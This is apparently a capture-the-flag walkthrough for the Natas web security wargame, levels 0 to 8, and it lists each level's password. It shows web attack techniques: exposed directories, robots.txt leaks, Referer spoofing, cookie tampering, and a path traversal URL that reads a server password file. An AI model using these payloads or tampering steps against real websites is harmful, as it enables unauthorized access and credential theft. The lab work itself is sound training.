# Natas

## Level 0
Next password is written in page source:
```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Level 0 -> 1
We again can retrieve the password by viewing the page source. This
time we can use a shortcut to view the page source (Ctrl + U for Firefox):
```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Level 1 -> 2
Viewing the source of this page reveals an image being loaded from the
`/files/pixel.png` route. Going to the `/files/` rout shows there is another
file called `users.txt` which contains the next password:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Level 2 -> 3
In the source is a hint saying:
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

This is a reference to the `robots.txt` which is used to tell search
engines which pages should not be indexed.
Going to the route `/robots.txt` reveals a hidden route:

```
User-agent: *
Disallow: /s3cr3t/
```

When going to the "secret" route we again find a file called `users.txt`:
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Level 3 -> 4
This pages states:
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```

This looks like it is referencing the `Referer` http-header. We have a series
of possibilities to set this header to the desired value. I chose to visit
`http://natas5.natas.labs.overthewire.org/` and set the `window.location` value
in the developer console:

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Level 4 -> 5
The page states:

```
Access disallowed. You are not logged in
```

When looking at the cookies in the developer tools we see that there is
a cookie named "loggedin" which has the value `0`. When we change its value
to `1` and reload the page we get:

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Level 5 -> 6
The given input field asks for a secret. When clicking the `View sourcecoce`
button we get:

```html
...
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We see that the secret is checked against the `$secret` variable which is
included in `includes/secret.inc`. When visiting this route with the browser
and viewing the raw response in the developer tools we get:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

When entering this secret into the input field we get:
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Level 6 -> 7
This page uses a url parameter to determine the file to be served.
This looks heavily like path traversal could be a thing. And indeed when entering
`http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8`
(the path of the password file is given in the page source) we get the next password:
```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

## Level 7 -> 8
Again we are greeted with an input field to put a secret into.
The php source looks like this:

```php
...
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
So we get an `$encodedSecret` which was manipulated in the following order:
- base64 encoded
- reversed
- turned to hexadecimal

We can just revert that manipulation using cli tools: 
```bash
echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
```

